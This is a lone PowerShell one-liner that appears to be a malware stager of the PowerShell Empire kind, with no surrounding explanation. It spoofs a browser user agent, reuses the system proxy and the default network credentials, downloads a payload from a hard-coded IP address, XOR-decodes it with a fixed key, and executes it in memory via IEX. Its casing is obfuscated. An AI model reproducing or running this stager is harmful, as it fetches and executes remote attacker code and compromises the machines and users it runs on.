
$WC=New-ObJEct SYsTEM.NET.WEbCLienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEAdeRs.ADD('User-Agent',$u);$WC.ProxY = [SYsTEm.NEt.WEbREquEsT]::DEFAuLTWeBPrOxY;$Wc.PRoxy.CrEDENTiAlS = [SySTeM.NEt.CreDENtialCAche]::DEFAuLtNEtworKCredEntiAlS;$K='098f6bcd4621d373cade4e832627b4f6';$i=0;[ChaR[]]$B=([CHAR[]]($Wc.DOWnlOadStrINg("http://166.78.124.106:80/index.asp")))|%{$_-bXOr$k[$I++%$k.LengTh]};IEX ($B-jOiN'')

